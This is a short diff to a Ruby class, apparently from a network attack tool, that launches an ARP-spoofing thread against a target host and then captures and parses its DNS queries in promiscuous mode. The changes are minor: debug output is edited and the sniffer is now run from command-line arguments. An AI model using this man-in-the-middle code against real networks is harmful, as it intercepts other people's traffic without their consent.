@@ -10,16 +10,16 @@ class Sniff
             @iface = iface
             @targetAddr = addr
             @targetMac = Utils.arp(addr, :iface => iface)
-
-
 	end
 	
 	def start
                 thread = Thread.new { @arpSpoof = ArpSpoof.new(@config, @targetMac, @targetAddr, @iface) ; @arpSpoof.start }
-                puts "WTF"
 		filter = "udp and port 53"
+
 		cap = Capture.new(:iface => $iface, :start => true, :promisc => true, \
 						  :filter => filter, :save=>true)
+
+                puts "DNS Capturing started"
 		cap.stream.each do |p|
 			@pkt = Packet.parse(p)
 			#check if packet type is query
@@ -87,4 +87,5 @@ def test
 	sniff.start
 end
 
-test
+sniff = Sniff.new(ARGV[0], ARGV[1])
+sniff.start
